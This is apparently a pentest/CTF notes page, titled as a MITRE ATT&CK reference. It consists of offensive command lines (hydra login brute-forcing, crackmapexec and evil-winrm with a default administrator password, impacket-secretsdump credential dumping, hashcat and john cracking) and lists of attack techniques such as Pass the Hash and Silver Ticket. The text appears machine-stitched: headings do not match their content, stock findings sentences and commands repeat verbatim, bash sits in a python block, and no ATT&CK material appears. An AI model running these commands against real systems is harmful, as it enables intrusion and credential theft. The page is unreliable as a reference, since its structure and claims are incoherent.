---
TitleSEO: "MITRE ATT&CK Framework Reference | ZureFX"
TitlePost: "MITRE ATT&CK Framework Reference"
Author: "ZureFX"
Description: "Personal notes on MITRE ATT&CK Framework Reference. Quick reference for pentesting and CTF challenges."
Keywords: "windows, dfir, enumeration, networking, lateral movement"
URL: "https://zurefx.github.io/notes/note-mitre-att&ck-framework-reference-627.html"
URL_IMAGES: ""
Date: "2025-10-04"
Tags: "Windows, DFIR, Enumeration, Networking, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-mitre-att&ck-framework-reference-627"
Permalink: "/notes/note-mitre-att&ck-framework-reference-627.html"
BtnLabel: "Read Notes"
Pick: 0
---
## RDP

### SSH

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.110.137.144 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.13.6.164 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
nmap -sCV -p9200,27017,5985 10.18.106.247 -oN scan.txt
```

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

## wmiexec

### msfvenom

- `rubeus`
- `Insecure Deserialization`
- `kerbrute`

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

- `GetNPUsers`
- `psexec`
- `smbexec`
- `DNS Rebinding`
- `Pass the Hash`

## Command Injection

### Kali Linux

```python
gobuster dir -u http://10.128.115.174/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.112.172.228 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.111.83.9 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.115.234.54/FUZZ
```

```bash
gobuster dir -u http://10.54.233.65/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.232.95
evil-winrm -i 10.62.44.133 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

## secretsdump

### GetNPUsers

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file.

## chisel

### CSRF

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.106.70
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `Silver Ticket`
- `rpcclient`
- `nmap`
- `socat`

- `hydra`
- `Cron Job`
- `GetNPUsers`
